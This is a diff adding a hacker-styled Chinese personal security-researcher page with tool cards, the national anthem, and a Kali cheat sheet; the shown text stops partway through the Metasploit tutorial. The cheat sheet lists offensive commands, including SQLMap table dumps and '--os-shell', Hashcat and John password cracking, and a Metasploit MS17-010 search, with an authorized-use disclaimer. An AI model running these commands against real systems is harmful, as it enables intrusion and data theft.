@@ -1,0 +1,1305 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[SECURITY_RESEARCHER] - Terminal Access</title>
+    <script src="https://aisearch-task.bj.bcebos.com/static/tailwindcss-3.4.17.js"></script>
+    <style>
+        :root {
+            --hacker-green: #00ff41;
+            --hacker-green-dim: #00cc33;
+            --hacker-bg: #0a0a0a;
+            --hacker-bg-terminal: #0d0d0d;
+            --hacker-border: #1a3a1a;
+            --hacker-red: #ff3333;
+            --hacker-amber: #ffb000;
+            --hacker-blue: #00bfff;
+        }
+
+        * {
+            font-family: 'SF Mono', 'Menlo', 'Consolas', 'Courier New', 'Microsoft YaHei', monospace;
+        }
+
+        body {
+            background: var(--hacker-bg);
+            color: var(--hacker-green);
+            overflow-x: hidden;
+        }
+
+        /* 矩阵雨背景 */
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.15;
+        }
+
+        /* 扫描线效果 */
+        .scanlines::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.15),
+                rgba(0, 0, 0, 0.15) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        /* 终端窗口样式 */
+        .terminal-window {
+            background: var(--hacker-bg-terminal);
+            border: 1px solid var(--hacker-border);
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1), inset 0 0 60px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
+
+        .terminal-header {
+            background: linear-gradient(180deg, #1a1a1a 0%, #0d0d0d 100%);
+            border-bottom: 1px solid var(--hacker-border);
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .terminal-btn {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .terminal-btn-close { background: #ff5f56; }
+        .terminal-btn-min { background: #ffbd2e; }
+        .terminal-btn-max { background: #27ca40; }
+
+        .terminal-title {
+            flex: 1;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .terminal-body {
+            padding: 20px;
+            line-height: 1.6;
+        }
+
+        /* 光标闪烁 */
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 18px;
+            background: var(--hacker-green);
+            animation: blink 1s infinite;
+            vertical-align: text-bottom;
+            margin-left: 2px;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        /* Glitch 故障效果 */
+        .glitch {
+            position: relative;
+        }
+
+        .glitch::before,
+        .glitch::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .glitch::before {
+            left: 2px;
+            text-shadow: -2px 0 var(--hacker-red);
+            animation: glitch-anim 3s infinite linear alternate-reverse;
+        }
+
+        .glitch::after {
+            left: -2px;
+            text-shadow: -2px 0 var(--hacker-blue);
+            animation: glitch-anim2 2s infinite linear alternate-reverse;
+        }
+
+        @keyframes glitch-anim {
+            0% { clip-path: inset(47% 0 54% 0); }
+            20% { clip-path: inset(60% 0 31% 0); }
+            40% { clip-path: inset(43% 0 14% 0); }
+            60% { clip-path: inset(25% 0 61% 0); }
+            80% { clip-path: inset(50% 0 36% 0); }
+            100% { clip-path: inset(55% 0 11% 0); }
+        }
+
+        @keyframes glitch-anim2 {
+            0% { clip-path: inset(65% 0 11% 0); }
+            20% { clip-path: inset(27% 0 55% 0); }
+            40% { clip-path: inset(88% 0 3% 0); }
+            60% { clip-path: inset(43% 0 33% 0); }
+            80% { clip-path: inset(22% 0 65% 0); }
+            100% { clip-path: inset(15% 0 70% 0); }
+        }
+
+        /* 黑客工具卡片 */
+        .tool-card {
+            background: rgba(0, 20, 0, 0.6);
+            border: 1px solid var(--hacker-border);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .tool-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--hacker-green), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .tool-card:hover {
+            border-color: var(--hacker-green);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
+            transform: translateY(-2px);
+        }
+
+        .tool-card:hover::before {
+            left: 100%;
+        }
+
+        /* 命令提示符 */
+        .prompt::before {
+            content: 'root@kali:~# ';
+            color: var(--hacker-red);
+            font-weight: bold;
+        }
+
+        .prompt-user::before {
+            content: 'user@sec:~$ ';
+            color: var(--hacker-amber);
+        }
+
+        /* 进度条 */
+        .skill-bar {
+            background: #111;
+            border: 1px solid var(--hacker-border);
+            height: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .skill-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--hacker-green-dim), var(--hacker-green));
+            position: relative;
+            transition: width 1.5s cubic-bezier(0.2, 0.8, 0.2, 1);
+        }
+
+        .skill-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: repeating-linear-gradient(
+                90deg,
+                transparent,
+                transparent 2px,
+                rgba(0,0,0,0.2) 2px,
+                rgba(0,0,0,0.2) 4px
+            );
+            animation: scan 1s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { background-position: 0 0; }
+            100% { background-position: 20px 0; }
+        }
+
+        /* 时间轴 */
+        .timeline-item {
+            position: relative;
+            padding-left: 30px;
+            border-left: 2px solid var(--hacker-border);
+            margin-left: 10px;
+        }
+
+        .timeline-item::before {
+            content: '>';
+            position: absolute;
+            left: -10px;
+            top: 0;
+            width: 18px;
+            height: 18px;
+            background: var(--hacker-bg);
+            border: 2px solid var(--hacker-green);
+            color: var(--hacker-green);
+            font-size: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+
+        /* ASCII 艺术标题 */
+        .ascii-art {
+            font-size: 8px;
+            line-height: 1;
+            color: var(--hacker-green);
+            white-space: pre;
+            text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
+        }
+
+        @media (min-width: 768px) {
+            .ascii-art {
+                font-size: 11px;
+            }
+        }
+
+        /* 链接样式 */
+        .hacker-link {
+            color: var(--hacker-blue);
+            text-decoration: none;
+            border-bottom: 1px dashed var(--hacker-blue);
+        }
+
+        .hacker-link:hover {
+            color: var(--hacker-green);
+            border-color: var(--hacker-green);
+            text-shadow: 0 0 5px var(--hacker-green);
+        }
+
+        /* 输入框样式 */
+        .terminal-input {
+            background: #000;
+            border: 1px solid var(--hacker-border);
+            color: var(--hacker-green);
+            padding: 10px 14px;
+            font-family: inherit;
+            outline: none;
+            width: 100%;
+        }
+
+        .terminal-input:focus {
+            border-color: var(--hacker-green);
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
+
+        .terminal-btn-submit {
+            background: transparent;
+            border: 1px solid var(--hacker-green);
+            color: var(--hacker-green);
+            padding: 10px 24px;
+            font-family: inherit;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .terminal-btn-submit:hover {
+            background: var(--hacker-green);
+            color: #000;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
+        }
+
+        /* 输出行 */
+        .output-line {
+            margin-bottom: 4px;
+        }
+
+        .output-comment { color: #556b2f; }
+        .output-success { color: var(--hacker-green); }
+        .output-warning { color: var(--hacker-amber); }
+        .output-error { color: var(--hacker-red); }
+        .output-info { color: var(--hacker-blue); }
+
+        /* 项目卡片 */
+        .project-card {
+            background: rgba(0, 10, 0, 0.7);
+            border: 1px solid var(--hacker-border);
+            transition: all 0.3s;
+        }
+
+        .project-card:hover {
+            border-color: var(--hacker-green);
+            box-shadow: 0 0 25px rgba(0, 255, 65, 0.15);
+        }
+
+        /* 徽章 */
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            font-size: 11px;
+            border: 1px solid;
+            margin-right: 6px;
+            margin-bottom: 6px;
+        }
+
+        .badge-green { border-color: var(--hacker-green); color: var(--hacker-green); }
+        .badge-red { border-color: var(--hacker-red); color: var(--hacker-red); }
+        .badge-amber { border-color: var(--hacker-amber); color: var(--hacker-amber); }
+        .badge-blue { border-color: var(--hacker-blue); color: var(--hacker-blue); }
+
+        /* 滚动条 */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--hacker-border);
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--hacker-green-dim);
+        }
+
+        /* 入场动画 */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.6s ease forwards;
+            opacity: 0.95;
+        }
+
+        .delay-1 { animation-delay: 0.1s; }
+        .delay-2 { animation-delay: 0.2s; }
+        .delay-3 { animation-delay: 0.3s; }
+        .delay-4 { animation-delay: 0.4s; }
+        .delay-5 { animation-delay: 0.5s; }
+
+        /* 闪烁文本 */
+        .blink {
+            animation: textBlink 1s step-end infinite;
+        }
+
+        @keyframes textBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        /* 导航终端 */
+        .nav-terminal {
+            position: sticky;
+            top: 0;
+            z-index: 50;
+            backdrop-filter: blur(10px);
+        }
+
+        .nav-link {
+            color: #666;
+            transition: all 0.2s;
+            padding: 4px 8px;
+        }
+
+        .nav-link:hover, .nav-link.active {
+            color: var(--hacker-green);
+            text-shadow: 0 0 8px var(--hacker-green);
+        }
+
+        /* 状态指示灯 */
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 6px;
+        }
+
+        .status-online {
+            background: var(--hacker-green);
+            box-shadow: 0 0 8px var(--hacker-green);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    </style>
+</head>
+<body class="scanlines">
+    <canvas id="matrix-canvas"></canvas>
+
+    <!-- 导航 -->
+    <nav class="nav-terminal bg-black/80 border-b border-[#1a3a1a] px-4 py-3">
+        <div class="max-w-6xl mx-auto flex flex-wrap items-center justify-between gap-3">
+            <div class="flex items-center gap-2">
+                <span class="status-dot status-online"></span>
+                <span class="text-[#00ff41] text-sm font-bold">SECURITY://SYSTEM</span>
+            </div>
+            <div class="flex flex-wrap gap-1 text-sm">
+                <a href="#home" class="nav-link">[~/home]</a>
+                <a href="#about" class="nav-link">[~/about]</a>
+                <a href="#tools" class="nav-link">[~/tools]</a>
+                <a href="#tutorials" class="nav-link">[~/tutorials]</a>
+                <a href="#guestbook" class="nav-link">[~/guestbook]</a>
+                <a href="#contact" class="nav-link">[~/contact]</a>
+            </div>
+        </div>
+    </nav>
+
+    <main class="max-w-6xl mx-auto px-4 py-8">
+
+        <!-- Hero 终端欢迎界面 -->
+        <section id="home" class="mb-12 fade-in">
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-btn terminal-btn-close"></div>
+                    <div class="terminal-btn terminal-btn-min"></div>
+                    <div class="terminal-btn terminal-btn-max"></div>
+                    <div class="terminal-title">root@kali: ~/welcome.sh — 120x32</div>
+                </div>
+                <div class="terminal-body text-[14px] md:text-[15px]">
+                    <div class="ascii-art mb-4">
+ ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
+ ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
+ ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
+ ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
+ ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
+ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
+                    </div>
+                    <div class="output-line output-comment">[*] Initializing secure shell connection...</div>
+                    <div class="output-line output-success">[+] Connection established from 127.0.0.1</div>
+                    <div class="output-line output-success">[+] Authentication: SUCCESS</div>
+                    <div class="output-line output-info">[i] Loading profile: Security Researcher / Penetration Tester</div>
+                    <div class="output-line output-info">[i] Welcome to my terminal. Type 'help' for available commands.</div>
+                    <div class="mt-4">
+                        <span class="prompt"></span>
+                        <span id="typing-text"></span>
+                        <span class="cursor"></span>
+                    </div>
+                    <div class="mt-6 flex flex-wrap gap-4">
+                        <button onclick="executeCommand('whoami')" class="terminal-btn-submit text-xs">[ WHOAMI ]</button>
+                        <button onclick="executeCommand('tutorials')" class="terminal-btn-submit text-xs">[ TUTORIALS ]</button>
+                        <button onclick="executeCommand('guestbook')" class="terminal-btn-submit text-xs">[ GUESTBOOK ]</button>
+                        <button onclick="executeCommand('tools')" class="terminal-btn-submit text-xs">[ TOOLS ]</button>
+                        <button onclick="executeCommand('contact')" class="terminal-btn-submit text-xs">[ CONTACT ]</button>
+                    </div>
+                    <div id="command-output" class="mt-4 text-sm"></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 关于我 -->
+        <section id="about" class="mb-12 fade-in delay-1">
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-btn terminal-btn-close"></div>
+                    <div class="terminal-btn terminal-btn-min"></div>
+                    <div class="terminal-btn terminal-btn-max"></div>
+                    <div class="terminal-title">root@kali: ~/national-anthem.txt</div>
+                </div>
+                <div class="terminal-body text-[14px] md:text-[15px]">
+                    <div class="prompt">cat national-anthem.txt</div>
+                    <div class="mt-4 flex flex-col items-center">
+                        <!-- ASCII 中国国旗 -->
+                        <div class="mb-6 text-[#ff3333] font-mono leading-tight text-[6px] md:text-[8px]">
+                            <pre>
+████████████████████████████████████████████████████████████████
+████████████████████████████████████████████████████████████████
+█████                                                          █████
+█████                                                          █████
+█████        ★                                                 █████
+█████              ★         ★                                 █████
+█████                    ★                                     █████
+█████              ★         ★                                 █████
+█████                                                          █████
+█████                                                          █████
+█████                                                          █████
+█████                                                          █████
+█████                                                          █████
+█████                                                          █████
+█████                                                          █████
+█████                                                          █████
+█████                                                          █████
+█████                                                          █████
+█████                                                          █████
+█████                                                          █████
+████████████████████████████████████████████████████████████████
+████████████████████████████████████████████████████████████████
+                            </pre>
+                            <div class="text-center text-[#ff3333] text-sm mt-2">中华人民共和国国歌 · 《义勇军进行曲》</div>
+                            <div class="text-center text-[#666] text-xs mt-1">田汉 作词 · 聂耳 作曲 | 1935年5月</div>
+                        </div>
+
+                        <!-- 义勇军进行曲简谱 -->
+                        <div class="w-full border border-[#ff3333]/30 p-4 bg-black/70 font-mono text-[13px] md:text-[15px] leading-loose overflow-x-auto">
+                            <div class="output-error text-center mb-3">[!] MARCH OF THE VOLUNTEERS - G 调 2/4 进行曲速度 ♩=120</div>
+                            <div class="output-comment text-center mb-4">// 起来！不愿做奴隶的人们！</div>
+                            
+                            <div class="whitespace-nowrap">
+<span class="text-[#ffb000]">5</span>  <span class="text-[#ffb000]">1</span>· <span class="text-[#ffb000]">1</span>  |  <span class="text-[#ffb000]">5</span>  <span class="text-[#ffb000]">5</span>  |  <span class="text-[#ffb000]">3</span>  <span class="text-[#ffb000]">1</span>· |
+<br><span class="text-[#cccccc]">起 来! 不 愿 做 奴 隶 的 人 们!</span>
+<br><br>
+<span class="text-[#ffb000]">5</span>  <span class="text-[#ffb000]">5</span>  <span class="text-[#ffb000]">5</span>  |  <span class="text-[#ffb000]">3</span>  <span class="text-[#ffb000]">3</span>  |  <span class="text-[#ffb000]">1</span>· <span class="text-[#ffb000]">3</span>  |  <span class="text-[#ffb000]">5</span>  -  |
+<br><span class="text-[#cccccc]">把 我 们 的 血 肉, 筑 成 我 们 新 的 长 城!</span>
+<br><br>
+<span class="text-[#ffb000]">1</span>· <span class="text-[#ffb000]">3</span>  <span class="text-[#ffb000]">5</span>  |  <span class="text-[#ffb000]">5</span>  <span class="text-[#ffb000]">5</span>  |  <span class="text-[#ffb000]">6</span>  <span class="text-[#ffb000]">5</span>  |  <span class="text-[#ffb000]">3</span>· <span class="text-[#ffb000]">1</span>  |
+<br><span class="text-[#cccccc]">中 华 民 族 到 了 最 危 险 的 时 候,</span>
+<br><br>
+<span class="text-[#ffb000]">5</span>  <span class="text-[#ffb000]">5</span>  <span class="text-[#ffb000]">3</span>  |  <span class="text-[#ffb000]">1</span>  <span class="text-[#ffb000]">·</span> <span class="text-[#ffb000]">5</span>  |  <span class="text-[#ffb000]">5</span>  <span class="text-[#ffb000]">5</span>  |  <span class="text-[#ffb000]">6</span>  -  |
+<br><span class="text-[#cccccc]">每 个 人 被 迫 着 发 出 最 后 的 吼 声。</span>
+<br><br>
+<span class="text-[#ffb000]">5</span>  |  <span class="text-[#ffb000]">6</span>· <span class="text-[#ffb000]">5</span>  |  <span class="text-[#ffb000]">3</span>  <span class="text-[#ffb000]">1</span>  |  <span class="text-[#ffb000]">5</span>  <span class="text-[#ffb000]">5</span>  |  <span class="text-[#ffb000]">6</span>  <span class="text-[#ffb000]">5</span>  |
+<br><span class="text-[#cccccc]">起 来! 起 来! 起 来!</span>
+<br><br>
+<span class="text-[#ffb000]">3</span>· <span class="text-[#ffb000]">1</span>  <span class="text-[#ffb000]">5</span>· <span class="text-[#ffb000]">5</span>  |  <span class="text-[#ffb000]">6</span>  <span class="text-[#ffb000]">5</span>  |  <span class="text-[#ffb000]">3</span>  <span class="text-[#ffb000]">·</span> <span class="text-[#ffb000]">3</span>  |  <span class="text-[#ffb000]">2</span>  -  |
+<br><span class="text-[#cccccc]">我 们 万 众 一 心, 冒 着 敌 人 的 炮 火</span>
+<br><br>
+<span class="text-[#ffb000]">5</span>  |  <span class="text-[#ffb000]">1</span>· <span class="text-[#ffb000]">3</span>  |  <span class="text-[#ffb000]">5</span>  <span class="text-[#ffb000]">3</span>  |  <span class="text-[#ffb000]">1</span>  -  |  <span class="text-[#ffb000]">1</span>  0  |
+<br><span class="text-[#cccccc]">前 进! 冒 着 敌 人 的 炮 火! 前 进! 前 进! 前 进! 进!</span>
+                            </div>
+                            
+                            <div class="mt-6 pt-4 border-t border-[#ff3333]/20 text-center text-xs text-[#556b2f]">
+                                [*] 中华人民共和国国歌于1949年9月27日第一届全国政协定为代国歌，<br>
+                                2004年3月14日第十届全国人大正式写入宪法。
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 黑客军火库 -->
+        <section id="tools" class="mb-12 fade-in delay-3">
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-btn terminal-btn-close"></div>
+                    <div class="terminal-btn terminal-btn-min"></div>
+                    <div class="terminal-btn terminal-btn-max"></div>
+                    <div class="terminal-title">root@kali: ~/arsenal/ -- 18 tools loaded</div>
+                </div>
+                <div class="terminal-body text-[14px] md:text-[15px]">
+                    <div class="prompt ls -la /usr/share/arsenal/</div>
+                    <div class="mt-4 output-comment"># Personal Hacking Arsenal - 常用武器库</div>
+                    
+                    <div class="grid sm:grid-cols-2 lg:grid-cols-3 gap-4 mt-4">
+                        <!-- 工具卡片 1 -->
+                        <div class="tool-card p-4">
+                            <div class="flex items-start gap-3">
+                                <div class="text-2xl">🔍</div>
+                                <div>
+                                    <div class="text-[#00ff41] font-bold">Nmap</div>
+                                    <div class="text-xs text-[#666] mb-2">端口扫描 / 主机发现</div>
+                                    <div class="text-xs text-[#999]">网络侦察首选工具，支持服务识别、脚本扫描、操作系统指纹探测。</div>
+                                </div>
+                            </div>
+                            <div class="mt-2 text-[10px] text-[#556b2f]">usage: nmap -sS -sV -A -T4 &lt;target_ip&gt;</div>
+                        </div>
+
+                        <!-- 工具卡片 2 -->
+                        <div class="tool-card p-4">
+                            <div class="flex items-start gap-3">
+                                <div class="text-2xl">💉</div>
+                                <div>
+                                    <div class="text-[#00ff41] font-bold">Burp Suite</div>
+                                    <div class="text-xs text-[#666] mb-2">Web渗透测试框架</div>
+                                    <div class="text-xs text-[#999]">抓包改包、爬虫扫描、Intruder爆破、Repeater重放，Web安全瑞士军刀。</div>
+                                </div>
+                            </div>
+                            <div class="mt-2 text-[10px] text-[#556b2f]">status: Professional Edition running</div>
+                        </div>
+
+                        <!-- 工具卡片 3 -->
+                        <div class="tool-card p-4">
+                            <div class="flex items-start gap-3">
+                                <div class="text-2xl">🐉</div>
+                                <div>
+                                    <div class="text-[#00ff41] font-bold">Metasploit</div>
+                                    <div class="text-xs text-[#666] mb-2">漏洞利用框架</div>
+                                    <div class="text-xs text-[#999]">世界最知名渗透框架，包含数千个exploit模块，后渗透功能强大。</div>
+                                </div>
+                            </div>
+                            <div class="mt-2 text-[10px] text-[#556b2f]">msf6 &gt; use exploit/multi/handler</div>
+                        </div>
+
+                        <!-- 工具卡片 4 -->
+                        <div class="tool-card p-4">
+                            <div class="flex items-start gap-3">
+                                <div class="text-2xl">🔑</div>
+                                <div>
+                                    <div class="text-[#00ff41] font-bold">Hashcat</div>
+                                    <div class="text-xs text-[#666] mb-2">密码破解 / 哈希恢复</div>
+                                    <div class="text-xs text-[#999]">GPU加速密码破解，支持300+哈希算法，最快的密码恢复工具。</div>
+                                </div>
+                            </div>
+                            <div class="mt-2 text-[10px] text-[#556b2f]">hashcat -m 1000 -a 0 hash.txt wordlist.txt</div>
+                        </div>
+
+                        <!-- 工具卡片 5 -->
+                        <div class="tool-card p-4">
+                            <div class="flex items-start gap-3">
+                                <div class="text-2xl">🎣</div>
+                                <div>
+                                    <div class="text-[#00ff41] font-bold">SQLMap</div>
+                                    <div class="text-xs text-[#666] mb-2">SQL注入自动化</div>
+                                    <div class="text-xs text-[#999]">自动检测和利用SQL注入漏洞，支持拖库、提权、执行命令。</div>
+                                </div>
+                            </div>
+                            <div class="mt-2 text-[10px] text-[#556b2f]">sqlmap -u "&lt;target_url&gt;" --dbs</div>
+                        </div>
+
+                        <!-- 工具卡片 6 -->
+                        <div class="tool-card p-4">
+                            <div class="flex items-start gap-3">
+                                <div class="text-2xl">🕷️</div>
+                                <div>
+                                    <div class="text-[#00ff41] font-bold">Nuclei</div>
+                                    <div class="text-xs text-[#666] mb-2">漏洞扫描器</div>
+                                    <div class="text-xs text-[#999]">基于模板的快速漏洞扫描器，社区持续更新POC，批量扫描神器。</div>
+                                </div>
+                            </div>
+                            <div class="mt-2 text-[10px] text-[#556b2f]">nuclei -u &lt;target_url&gt; -t cves/ -severity critical</div>
+                        </div>
+
+                        <!-- 工具卡片 7 -->
+                        <div class="tool-card p-4">
+                            <div class="flex items-start gap-3">
+                                <div class="text-2xl">🛡️</div>
+                                <div>
+                                    <div class="text-[#00ff41] font-bold">Cobalt Strike</div>
+                                    <div class="text-xs text-[#666] mb-2">红队作战平台</div>
+                                    <div class="text-xs text-[#999]">业界领先的APT模拟工具，钓鱼、马生成、C2通信、横向移动一体化。</div>
+                                </div>
+                            </div>
+                            <div class="mt-2 text-[10px] text-[#556b2f]">[+] Team server connected: 0.0.0.0:50050</div>
+                        </div>
+
+                        <!-- 工具卡片 8 -->
+                        <div class="tool-card p-4">
+                            <div class="flex items-start gap-3">
+                                <div class="text-2xl">⚡</div>
+                                <div>
+                                    <div class="text-[#00ff41] font-bold">Wireshark</div>
+                                    <div class="text-xs text-[#666] mb-2">网络流量分析</div>
+                                    <div class="text-xs text-[#999]">抓包分析工具，深度解析上千种协议，排查网络问题必备。</div>
+                                </div>
+                            </div>
+                            <div class="mt-2 text-[10px] text-[#556b2f]">capturing on eth0: 1245 packets captured</div>
+                        </div>
+
+                        <!-- 工具卡片 9 -->
+                        <div class="tool-card p-4">
+                            <div class="flex items-start gap-3">
+                                <div class="text-2xl">🔓</div>
+                                <div>
+                                    <div class="text-[#00ff41] font-bold">John the Ripper</div>
+                                    <div class="text-xs text-[#666] mb-2">密码破解工具</div>
+                                    <div class="text-xs text-[#999]">经典开源密码破解器，支持多种加密格式，适合离线哈希破解。</div>
+                                </div>
+                            </div>
+                            <div class="mt-2 text-[10px] text-[#556b2f]">john --wordlist=rockyou.txt hashes.txt</div>
+                        </div>
+                    </div>
+
+                    <div class="mt-6 pt-4 border-t border-[#1a3a1a]">
+                        <div class="output-warning">[!] 附加工具: Aircrack-ng · Hydra · Mimikatz · BloodHound · Responder · Empire · Frida · IDA Pro · Ghidra · Xray · Dirsearch · Gobuster · Wfuzz · Empire</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 黑客工具教学 -->
+        <section id="tutorials" class="mb-12 fade-in delay-3">
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="terminal-btn terminal-btn-close"></div>
+                    <div class="terminal-btn terminal-btn-min"></div>
+                    <div class="terminal-btn terminal-btn-max"></div>
+                    <div class="terminal-title">root@kali: ~/tutorials/README.md -- Hacker Toolkit Cheatsheet</div>
+                </div>
+                <div class="terminal-body text-[14px] md:text-[15px]">
+                    <div class="prompt">cat README.md</div>
+                    <div class="mt-4 output-comment"># Kali Linux Hacking Toolkit Tutorials</div>
+                    <div class="output-info">[i] All commands are for educational purposes ONLY. Test only on authorized targets.</div>
+                    <div class="output-warning">[!] Unauthorized scanning/attacking is illegal. Use responsibly.</div>
+
+                    <div class="mt-8 space-y-8">
+
+                        <!-- Nmap 教程 -->
+                        <div class="border border-[#1a3a1a] bg-black/60 p-5">
+                            <div class="flex items-center gap-3 mb-4">
+                                <span class="text-2xl">🔍</span>
+                                <h3 class="text-[#00ff41] font-bold text-lg">Nmap · 端口扫描/主机发现</h3>
+                            </div>
+                            <div class="text-xs text-[#666] mb-3">Kali Linux 预装 · 信息收集阶段最核心工具</div>
+                            
+                            <div class="space-y-4">
+                                <div>
+                                    <div class="output-comment mb-1"># 基础快速扫描（默认扫1000常用端口）</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">nmap &lt;target_ip&gt;</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 全端口+服务版本+操作系统 全能扫描（渗透标准操作）</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">nmap -sV -A -T4 &lt;target_ip&gt;</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 扫描全端口(1-65535)</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">nmap -p- -T4 &lt;target_ip&gt;</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 内网网段存活主机扫描（不扫端口，速度极快）</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">nmap -sn 192.168.1.0/24</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># SYN半开扫描（隐蔽，不建立完整TCP连接）</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">sudo nmap -sS -sV -T4 &lt;target_ip&gt;</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- SQLMap 教程 -->
+                        <div class="border border-[#1a3a1a] bg-black/60 p-5">
+                            <div class="flex items-center gap-3 mb-4">
+                                <span class="text-2xl">🎣</span>
+                                <h3 class="text-[#00ff41] font-bold text-lg">SQLMap · SQL注入自动化</h3>
+                            </div>
+                            <div class="text-xs text-[#666] mb-3">Python 编写 · 自动检测并利用SQL注入漏洞</div>
+                            
+                            <div class="space-y-4">
+                                <div>
+                                    <div class="output-comment mb-1"># 检测URL参数是否存在注入</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">sqlmap -u "http://example.com/product.php?id=1"</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 列出所有数据库</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">sqlmap -u "http://example.com/product.php?id=1" --dbs</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 指定数据库，列出所有表</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">sqlmap -u "http://example.com/product.php?id=1" -D target_db --tables</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 导出指定表的所有数据（拖库）</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">sqlmap -u "http://example.com/product.php?id=1" -D target_db -T users --dump</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># POST请求注入</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">sqlmap -u "http://example.com/login.php" --data="user=admin&pass=123"</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 启动交互Shell（需要高权限）</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">sqlmap -u "http://example.com/product.php?id=1" --os-shell</div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Metasploit 教程 -->
+                        <div class="border border-[#1a3a1a] bg-black/60 p-5">
+                            <div class="flex items-center gap-3 mb-4">
+                                <span class="text-2xl">🐉</span>
+                                <h3 class="text-[#00ff41] font-bold text-lg">Metasploit (MSF) · 漏洞利用框架</h3>
+                            </div>
+                            <div class="text-xs text-[#666] mb-3">渗透测试界最强大框架 · 内置2000+漏洞利用模块</div>
+                            
+                            <div class="space-y-4">
+                                <div>
+                                    <div class="output-comment mb-1"># 启动MSF控制台</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">msfconsole</div>
+                                </div>
+                                <div>
+                                    <div class="output-comment mb-1"># 搜索漏洞模块（以永恒之蓝MS17-010为例）</div>
+                                    <div class="text-[#cccccc] font-mono text-sm">msf6 > search ms17-010</div>
+                                </div>
+                                <div>
